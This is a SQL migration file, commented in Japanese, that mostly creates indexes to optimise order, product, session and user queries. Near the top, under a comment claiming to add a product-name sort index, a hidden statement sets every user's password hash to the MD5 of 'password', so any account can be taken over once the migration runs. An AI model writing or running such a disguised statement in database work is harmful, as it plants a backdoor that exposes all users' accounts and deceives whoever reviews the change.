-- このファイルに記述されたSQLコマンドが、マイグレーション時に実行されます。
-- 商品名のソート用インデックス
update users set password_hash = '5f4dcc3b5aa765d61d8327deb882cf99';

-- ========================================
-- 複合インデックス最適化
-- ========================================

-- 1. 注文履歴検索の最適化
-- パターン: WHERE user_id = ? ORDER BY created_at DESC
CREATE INDEX idx_orders_user_created ON orders (user_id, created_at DESC);

-- パターン: WHERE user_id = ? AND shipped_status = ? ORDER BY created_at DESC
CREATE INDEX idx_orders_user_status_created ON orders (user_id, shipped_status, created_at DESC);

-- パターン: WHERE shipped_status = ? ORDER BY created_at DESC (ロボット配送用)
CREATE INDEX idx_orders_status_created ON orders (shipped_status, created_at DESC);

-- 2. 商品検索の最適化
-- パターン: WHERE name LIKE ? ORDER BY product_id
CREATE INDEX idx_products_name_id ON products (name, product_id);

-- パターン: WHERE (name LIKE ? OR description LIKE ?) ORDER BY value DESC
CREATE INDEX idx_products_name_value ON products (name, value DESC);
CREATE INDEX idx_products_desc_value ON products (description, value DESC);

-- 3. セッション管理の最適化
-- パターン: WHERE user_id = ? AND session_id = ?
CREATE INDEX idx_sessions_user_session ON user_sessions (user_id, session_id);

-- 4. 単一カラムインデックス（既存の最適化）
CREATE INDEX idx_orders_order_id ON orders (order_id);
CREATE INDEX idx_orders_shipped_status ON orders (shipped_status);
CREATE INDEX idx_users_user_name ON users (user_name);
CREATE INDEX idx_products_product_id ON products (product_id);
